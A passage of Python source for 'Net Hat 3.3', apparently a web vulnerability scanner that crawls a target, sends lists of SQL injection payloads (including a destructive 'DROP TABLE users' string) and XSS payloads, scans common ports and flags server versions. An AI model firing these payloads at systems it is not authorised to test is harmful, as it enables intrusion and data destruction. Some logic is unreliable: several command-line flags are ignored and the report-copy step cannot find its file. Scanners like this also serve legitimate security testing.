            print(f"{Colors.GREEN}  ✅ No parameters found for SQL testing{Colors.RESET}")
            return
        
        print(f"{Colors.CYAN}  📌 Testing {len(links_with_params)} URLs with parameters{Colors.RESET}")
        
        payloads = [
            ("' OR '1'='1", "OR 1=1"),
            ("' UNION SELECT NULL--", "UNION SELECT"),
            ("' AND 1=1--", "AND 1=1"),
            ("'; DROP TABLE users--", "DROP TABLE"),
            ("' OR SLEEP(5)--", "SLEEP"),
            ("1' ORDER BY 1--", "ORDER BY"),
            ("' WAITFOR DELAY '0:0:5'--", "WAITFOR DELAY"),
            ("' AND 1=0 UNION SELECT 1,2,3,4,5--", "UNION SELECT"),
            ("' OR 'x'='x", "OR x=x"),
            ("' OR 1=1#", "OR 1=1#"),
            ("' OR 1=1/*", "OR 1=1/*"),
            ("1 OR 1=1", "OR 1=1"),
            ("1' AND '1'='1", "AND 1=1"),
            ("' OR 1=1-- -", "OR 1=1-- -"),
            ("' OR 1=1;--", "OR 1=1;--"),
            ("' OR 1=1'", "OR 1=1'"),
            ("' OR 'a'='a", "OR a=a"),
            ("' OR 1=1 LIMIT 1--", "LIMIT 1"),
            ("1' UNION SELECT 1,2,3--", "UNION SELECT"),
            ("1 AND 1=1", "AND 1=1"),
            ("1 AND 1=2", "AND 1=2"),
        ]
        
        found = []
        for url in links_with_params[:30]:
            for payload, desc in payloads:
                try:
                    test_url = url + payload
                    response = self.session.get(test_url, timeout=5, verify=False)
                    
                    error_patterns = [
                        'sql', 'mysql', 'syntax error', 'unclosed quotation',
                        'you have an error', 'warning', 'odbc', 'driver',
                        'db2', 'oracle', 'microsoft ole db', 'sqlite',
                        'postgresql', 'mariadb', 'mysqli', 'pdo_mysql',
                        'mysql_fetch_array', 'ORA-', 'PL/SQL', 'SQLite3',
                        'Microsoft OLE DB', 'ODBC Driver'
                    ]
                    
                    html = response.text.lower()
                    for pattern in error_patterns:
                        if pattern in html:
                            found.append({
                                'url': test_url,
                                'payload': payload,
                                'type': 'SQL Injection',
                                'severity': 'critical'
                            })
                            break
                except:
                    pass
        
        if found:
            for vuln in found:
                self.results['vulnerabilities'].append(vuln)
                self.results['summary']['critical'] += 1
                print(f"{Colors.RED}  🔴 SQL Injection: {vuln['url']}{Colors.RESET}")
                print(f"     📌 Payload: {vuln['payload']}")
        else:
            print(f"{Colors.GREEN}  ✅ No SQL Injection found{Colors.RESET}")
        
        return found
    
    def test_xss_advanced(self):
        """Advanced XSS testing with many payloads"""
        print(f"\n{Colors.BLUE}[+] Testing XSS...{Colors.RESET}")
        
        links_with_params = []
        for link in self.all_links:
            if '?' in link and '=' in link:
                links_with_params.append(link)
        
        if not links_with_params:
            print(f"{Colors.GREEN}  ✅ No parameters found for XSS testing{Colors.RESET}")
            return
        
        payloads = [
            ('<script>alert("XSS")</script>', 'Script Tag'),
            ('<img src=x onerror=alert(1)>', 'Image onerror'),
            ('"><script>alert(1)</script>', 'Break out'),
            ('<svg onload=alert(1)>', 'SVG onload'),
            ('javascript:alert(1)', 'javascript:'),
            ('<body onload=alert(1)>', 'Body onload'),
            ('<input onfocus=alert(1) autofocus>', 'Input onfocus'),
            ('<iframe src="javascript:alert(1)">', 'Iframe'),
            ('<div onmouseover=alert(1)>', 'Div onmouseover'),
            ('<a href="javascript:alert(1)">', 'Link javascript:'),
            ('<svg/onload=alert(1)>', 'SVG onload short'),
            ('<img/src=x onerror=alert(1)>', 'Image onerror short'),
            ('<IMG SRC="javascript:alert(1)">', 'Image JS'),
            ('<IMG SRC=javascript:alert(1)>', 'Image JS short'),
            ('<IMG SRC=JaVaScRiPt:alert(1)>', 'Image JS case'),
            ('<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">', 'Data URI XSS'),
            ('<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">', 'Object XSS'),
            ('<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">', 'Embed XSS'),
            ('<svg><script>alert(1)</script>', 'SVG Script'),
            ('<svg onload="alert(1)">', 'SVG onload')
        ]
        
        found = []
        for url in links_with_params[:30]:
            for payload, desc in payloads:
                try:
                    test_url = url + payload
                    response = self.session.get(test_url, timeout=5, verify=False)
                    
                    if payload.replace('"', '') in response.text or payload in response.text:
                        found.append({
                            'url': test_url,
                            'payload': payload,
                            'type': 'XSS',
                            'severity': 'high',
                            'description': desc
                        })
                        break
                except:
                    pass
        
        if found:
            for vuln in found:
                self.results['vulnerabilities'].append(vuln)
                self.results['summary']['high'] += 1
                print(f"{Colors.RED}  🔴 XSS: {vuln['url']}{Colors.RESET}")
                print(f"     📌 Payload: {vuln['payload']}")
        else:
            print(f"{Colors.GREEN}  ✅ No XSS found{Colors.RESET}")
        
        return found
    
    def scan_ports_advanced(self):
        """Advanced port scanning"""
        print(f"\n{Colors.BLUE}[+] Scanning ports...{Colors.RESET}")
        
        try:
            parsed = urlparse(self.target_url)
            host = parsed.netloc.split(':')[0]
            
            all_ports = [
                21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 
                443, 445, 465, 587, 993, 995, 1723, 3306, 3389, 
                5432, 5900, 6379, 8080, 8443, 27017,
                1433, 1521, 2082, 2083, 2222, 3000, 5000, 7000,
                8000, 8081, 8443, 9000, 9443, 10000
            ]
            
            open_ports = []
            for port in all_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((host, port))
                    if result == 0:
                        service = self.get_port_service(port)
                        open_ports.append({'port': port, 'service': service})
                        self.results['open_ports'].append({'port': port, 'service': service})
                        self.results['vulnerabilities'].append({
                            'url': f'{host}:{port}',
                            'type': 'Open Port',
                            'severity': 'info',
                            'description': f'Port {port} open ({service})'
                        })
                        self.results['summary']['info'] += 1
                        print(f"{Colors.CYAN}  🌐 Port {port} open ({service}){Colors.RESET}")
                    sock.close()
                except:
                    pass
            
            if not open_ports:
                print(f"{Colors.GREEN}  ✅ No open ports found{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.RED}  ❌ Port scan error: {e}{Colors.RESET}")
    
    def get_port_service(self, port):
        """Get service name from port"""
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
            53: 'DNS', 80: 'HTTP', 110: 'POP3', 111: 'RPC',
            135: 'RPC', 139: 'NetBIOS', 143: 'IMAP',
            443: 'HTTPS', 445: 'SMB', 465: 'SMTPS',
            587: 'SMTP', 993: 'IMAPS', 995: 'POP3S',
            1433: 'MSSQL', 1521: 'Oracle', 1723: 'PPTP',
            2082: 'cPanel', 2083: 'cPanel SSL', 2222: 'SSH Alt',
            3000: 'Node.js', 3306: 'MySQL', 3389: 'RDP',
            5000: 'Flask', 5432: 'PostgreSQL', 5900: 'VNC',
            6379: 'Redis', 7000: 'Cassandra', 8000: 'HTTP Alt',
            8080: 'HTTP Alt', 8081: 'HTTP Alt', 8443: 'HTTPS Alt',
            9000: 'PHP-FPM', 9443: 'HTTPS Alt', 10000: 'Webmin',
            27017: 'MongoDB'
        }
        return services.get(port, 'Unknown')
    
    def get_server_info_advanced(self):
        """Advanced server information gathering"""
        print(f"\n{Colors.BLUE}[+] Gathering server information...{Colors.RESET}")
        
        try:
            response = self.session.get(self.target_url, timeout=5, verify=False)
            
            info = {}
            headers = response.headers
            
            # All headers
            for key, value in headers.items():
                info[key] = value
            
            # Extract server info
            if 'Server' in headers:
                server = headers['Server']
                self.results['server_info']['server'] = server
                
                # Check for vulnerable versions
                if 'Apache/2.4.49' in server:
                    self.results['vulnerabilities'].append({
                        'url': self.target_url,
                        'type': 'Apache Path Traversal (CVE-2021-42013)',
                        'severity': 'critical',
                        'description': 'Apache 2.4.49 vulnerable to Path Traversal'
                    })
                    self.results['summary']['critical'] += 1
                    print(f"{Colors.RED}  🔴 Apache 2.4.49 - Path Traversal vulnerability{Colors.RESET}")
                
                if 'nginx/1.14' in server:
                    self.results['vulnerabilities'].append({
                        'url': self.target_url,
                        'type': 'Nginx 1.14 - Potential vulnerabilities',
                        'severity': 'medium',
                        'description': 'Nginx 1.14 may have known vulnerabilities'
                    })
                    self.results['summary']['medium'] += 1
            
            if 'X-Powered-By' in headers:
                self.results['server_info']['powered_by'] = headers['X-Powered-By']
            
            print(f"{Colors.CYAN}  📌 Server: {info.get('Server', 'Unknown')}{Colors.RESET}")
            print(f"{Colors.CYAN}  📌 Powered By: {info.get('X-Powered-By', 'Unknown')}{Colors.RESET}")
            print(f"{Colors.CYAN}  📌 Content-Type: {info.get('Content-Type', 'Unknown')}{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.RED}  ❌ Error getting server info: {e}{Colors.RESET}")
    
    def generate_report(self):
        """Generate comprehensive JSON report with all data"""
        print(f"\n{Colors.PURPLE}[+] Generating comprehensive report...{Colors.RESET}")
        
        # Update statistics
        self.results['statistics'] = {
            'total_links': len(self.all_links),
            'total_forms': len(self.all_forms),
            'total_scripts': len(self.all_scripts),
            'total_images': len(self.all_images),
            'total_files': len(self.all_files),
            'total_api_endpoints': len(self.api_endpoints),
            'total_emails': len(self.email_addresses),
            'total_phones': len(self.phone_numbers),
            'total_source_files': len(self.source_files),
            'total_directories': len(self.directories),
            'total_parameters': len(self.parameters),
            'total_js_variables': len(self.js_variables)
        }
        
        # Add all collected data
        self.results['links'] = list(self.all_links)
        self.results['forms'] = self.all_forms
        self.results['scripts'] = self.all_scripts
        self.results['images'] = self.all_images
        self.results['files'] = self.all_files
        self.results['api_endpoints'] = self.api_endpoints
        self.results['hidden_comments'] = self.hidden_comments[:100]
        self.results['emails'] = list(self.email_addresses)
        self.results['phones'] = list(self.phone_numbers)
        self.results['source_files'] = self.source_files
        self.results['directories'] = list(self.directories)
        self.results['parameters'] = list(self.parameters)
        self.results['js_variables'] = list(self.js_variables)
        self.results['cookies'] = self.results['cookies']
        
        # Generate filename from target
        domain = urlparse(self.target_url).netloc.replace(':', '_').replace('.', '_')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{domain}_{timestamp}.json"
        
        # Save to reports directory
        report_path = os.path.join(self.reports_dir, filename)
        
        with open(report_path, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        print(f"{Colors.GREEN}✅ Report saved: {report_path}{Colors.RESET}")
        return report_path
    
    def print_summary(self):
        """Print detailed summary"""
        print(f"\n{Colors.BOLD}{'='*80}{Colors.RESET}")
        print(f"{Colors.BOLD}📊 SCAN SUMMARY - NET HAT 3.3{Colors.RESET}")
        print(f"{'='*80}")
        
        summary = self.results['summary']
        stats = self.results['statistics']
        
        print(f"{Colors.RED}  🔴 CRITICAL: {summary['critical']}{Colors.RESET}")
        print(f"{Colors.YELLOW}  🟡 HIGH: {summary['high']}{Colors.RESET}")
        print(f"{Colors.BLUE}  🟠 MEDIUM: {summary['medium']}{Colors.RESET}")
        print(f"{Colors.CYAN}  🟢 LOW: {summary['low']}{Colors.RESET}")
        print(f"{Colors.DIM}  ⚪ INFO: {summary['info']}{Colors.RESET}")
        print(f"{'='*80}")
        
        print(f"{Colors.CYAN}📊 STATISTICS:{Colors.RESET}")
        print(f"  🔗 Total Links: {stats['total_links']}")
        print(f"  📝 Total Forms: {stats['total_forms']}")
        print(f"  📜 Total Scripts: {stats['total_scripts']}")
        print(f"  🖼️ Total Images: {stats['total_images']}")
        print(f"  📄 Total Files: {stats['total_files']}")
        print(f"  🌐 API Endpoints: {stats['total_api_endpoints']}")
        print(f"  📧 Emails Found: {stats['total_emails']}")
        print(f"  📱 Phones Found: {stats['total_phones']}")
        print(f"  📂 Source Files: {stats['total_source_files']}")
        print(f"  📁 Directories: {stats['total_directories']}")
        print(f"  🔑 Parameters: {stats['total_parameters']}")
        print(f"  📦 JS Variables: {stats['total_js_variables']}")
        print(f"  🌐 Open Ports: {len(self.results['open_ports'])}")
        print(f"  🔍 Total Vulnerabilities: {len(self.results['vulnerabilities'])}")
        print(f"{'='*80}")
        
        if self.results['technologies']:
            print(f"{Colors.CYAN}💻 Technologies Detected:{Colors.RESET}")
            for tech in self.results['technologies'][:10]:
                print(f"  • {tech}")
            if len(self.results['technologies']) > 10:
                print(f"  • ... and {len(self.results['technologies']) - 10} more")
            print(f"{'='*80}")
    
    def run_full_scan(self):
        """Run the complete advanced scan"""
        self.print_banner()
        self.print_header()
        
        start_time = time.time()
        
        # PHASE 1: Crawling
        print(f"\n{Colors.PURPLE}[+] PHASE 1: Advanced Crawling & Discovery{Colors.RESET}")
        print("=" * 80)
        self.crawl(self.target_url)
        
        print(f"\n{Colors.GREEN}✅ Crawling complete: {len(self.all_links)} links found{Colors.RESET}")
        
        # PHASE 2: Vulnerability Testing
        print(f"\n{Colors.PURPLE}[+] PHASE 2: Vulnerability Testing{Colors.RESET}")
        print("=" * 80)
        
        self.get_server_info_advanced()
        self.test_sql_injection_advanced()
        self.test_xss_advanced()
        self.scan_ports_advanced()
        
        # PHASE 3: Report Generation
        print(f"\n{Colors.PURPLE}[+] PHASE 3: Report Generation{Colors.RESET}")
        print("=" * 80)
        
        elapsed = time.time() - start_time
        self.results['duration_seconds'] = elapsed
        
        self.print_summary()
        
        print(f"\n{Colors.CYAN}⏱️ Total time: {elapsed:.2f} seconds{Colors.RESET}")
        print(f"{Colors.GREEN}✅ Scan completed successfully!{Colors.RESET}")
        
        report_file = self.generate_report()
        
        print(f"\n{Colors.GREEN}╔══════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.GREEN}║  🔥 Net Hat 3.3 - Scan Complete - By moshta3el (@JYI_L)    ║{Colors.RESET}")
        print(f"{Colors.GREEN}╚══════════════════════════════════════════════════════════════╝{Colors.RESET}")
        
        return self.results

# ============================================
# Main Function
# ============================================
def main():
    parser = argparse.ArgumentParser(
        description='Net Hat 3.3 - Advanced Vulnerability Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python Net_Hat_3.3.py -u https://juice-shop.herokuapp.com
  python Net_Hat_3.3.py -u http://localhost -d 5 -t 30
  python Net_Hat_3.3.py -u https://example.com -o my_report.json
        '''
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-d', '--depth', type=int, default=5, help='Crawl depth (default: 5)')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of threads (default: 20)')
    parser.add_argument('-o', '--output', help='Custom report filename')
    parser.add_argument('--no-ports', action='store_true', help='Skip port scanning')
    parser.add_argument('--no-sql', action='store_true', help='Skip SQL injection testing')
    parser.add_argument('--no-xss', action='store_true', help='Skip XSS testing')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    if not args.url.startswith(('http://', 'https://')):
        args.url = 'https://' + args.url
    
    scanner = NetHatScanner(args.url, args.depth, args.threads)
    
    try:
        results = scanner.run_full_scan()
        
        if args.output:
            # Copy the latest report to custom name
            import shutil
            domain = urlparse(args.url).netloc.replace(':', '_').replace('.', '_')
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            default_file = f"{domain}_{timestamp}.json"
            source_path = os.path.join(scanner.reports_dir, default_file)
            if os.path.exists(source_path):
                shutil.copy(source_path, args.output)
                print(f"{Colors.GREEN}✅ Report copied to: {args.output}{Colors.RESET}")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}⚠️ Scan interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()